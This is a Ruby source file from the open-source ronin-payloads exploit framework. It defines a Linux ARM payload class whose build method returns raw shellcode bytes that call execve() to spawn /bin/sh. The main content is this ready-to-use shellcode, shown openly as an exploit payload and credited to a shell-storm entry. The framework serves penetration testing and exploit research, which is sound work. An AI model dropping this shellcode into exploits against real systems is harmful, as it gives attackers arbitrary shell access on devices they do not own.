# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/exec_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module ARM
          #
          # Linux ARM shellcode that calls `execve()` with `/bin/sh`.
          #
          class ExecShell < ExecShellPayload

            register 'shellcode/linux/arm/exec_shell'

            arch :arm
            os :linux

            author "Jonathan 'dummys' Borgeaud", twitter: 'dummys1337',
                                                 website: 'fapperz.org'

            summary 'Linux ARM execve() shellcode'
            description <<~DESC
            Linux ARM shellcode that calls execve() with "/bin/sh".
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-904.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x01\x30\x8f\xe2" \
                         "\x13\xff\x2f\xe1" \
                         "\x78\x46\x0e\x30" \
                         "\x01\x90\x49\x1a" \
                         "\x92\x1a\x08\x27" \
                         "\xc2\x51\x03\x37" \
                         "\x01\xdf\x2f\x62" \
                         "\x69\x6e\x2f\x2f" \
                         "\x73\x68".b
            end

          end
        end
      end
    end
  end
end
